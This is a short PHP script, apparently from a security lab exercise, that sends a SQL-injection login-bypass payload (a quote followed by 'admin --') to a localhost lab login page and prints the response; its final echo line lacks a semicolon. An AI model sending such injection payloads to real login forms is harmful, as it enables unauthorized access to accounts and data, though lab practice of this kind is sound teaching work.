<?php
   $url="http://localhost/lab09/login.php?u=\"admin%20--%20";
   $result = file_get_contents($url);

   print($result);

   echo "\n"

?>